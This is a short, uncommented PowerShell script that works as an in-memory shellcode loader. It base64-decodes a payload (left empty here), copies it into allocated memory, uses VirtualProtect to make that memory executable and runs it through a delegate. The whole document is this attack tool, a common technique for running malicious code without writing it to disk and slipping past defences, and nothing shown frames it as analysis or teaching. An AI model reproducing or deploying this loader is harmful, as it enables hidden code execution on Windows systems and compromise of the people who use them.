$sc64 = "
"
$sc = [System.Convert]::FromBase64String($sc64)
$size = $sc.Length

$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $size)

$oldProtect = 0
$VirtualProtect = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "VP" -Namespace "Win32" -PassThru

$VirtualProtect::VirtualProtect($ptr, [uint32]$size, 0x40, [ref]$oldProtect)

$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $ptr,
    (New-Object System.Func[IntPtr])
)
$delegate.Invoke()
